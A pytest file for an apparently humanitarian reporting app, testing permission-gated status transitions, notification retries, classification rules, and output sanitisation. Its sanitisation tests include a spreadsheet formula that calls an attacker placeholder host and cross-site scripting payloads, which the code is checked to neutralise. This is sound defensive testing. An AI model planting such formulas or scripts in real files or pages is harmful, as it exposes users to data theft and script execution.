from types import SimpleNamespace
from typing import Any, cast
from uuid import uuid4

import pytest

from app.core.enums import ActionStatus, Classification, VerificationStatus
from app.db.models.core import Report
from app.modules.early_actions.service import transition as action_transition
from app.modules.field_verification.service import transition as verification_transition
from app.modules.notifications.service import deduplication_key, retry_decision
from app.modules.reports.service import preserves_classification, report_html, safe_csv_cell


def test_field_submit_and_review_capabilities_are_separate() -> None:
    assert (
        verification_transition(
            VerificationStatus.OPEN, VerificationStatus.SUBMITTED, {"field_reports.submit"}
        )
        is VerificationStatus.SUBMITTED
    )
    with pytest.raises(PermissionError):
        verification_transition(
            VerificationStatus.SUBMITTED, VerificationStatus.VERIFIED, {"field_reports.submit"}
        )


def test_action_cannot_complete_without_evidence() -> None:
    with pytest.raises(ValueError):
        action_transition(
            ActionStatus.IN_PROGRESS, ActionStatus.COMPLETED, {"early_actions.complete"}
        )
    assert (
        action_transition(
            ActionStatus.IN_PROGRESS,
            ActionStatus.COMPLETED,
            {"early_actions.complete"},
            evidence_count=1,
        )
        is ActionStatus.COMPLETED
    )


def test_notification_retry_is_bounded_and_deduplicated() -> None:
    assert retry_decision(4).dead_letter is True
    assert retry_decision(0).retry_at is not None
    assert deduplication_key("alert-1", "user-1", "sms") == "alert-1:user-1:sms"


def test_report_classification_cannot_be_downgraded() -> None:
    assert preserves_classification(Classification.PUBLIC, Classification.PARTNER)
    assert not preserves_classification(Classification.INTERNAL, Classification.PUBLIC)
    assert safe_csv_cell("=WEBSERVICE(\"https://attacker.invalid\")").startswith("'=")


def test_report_html_escapes_authored_content() -> None:
    report = cast(
        Report,
        cast(
            Any,
            SimpleNamespace(
                id=uuid4(), title="<script>alert(1)</script>",
                classification=Classification.INTERNAL, reporting_period="2027-Gu",
                admin_unit_id=uuid4(), boundary_version="synthetic-v1", published_at=None,
                sections=[{"heading": "<b>Situation</b>", "body": "<img src=x onerror=alert(1)>"}],
                findings=[], recommendations=[],
            ),
        ),
    )
    document = report_html(report)
    assert "<script>alert(1)</script>" not in document
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in document
    assert "<img src=x" not in document
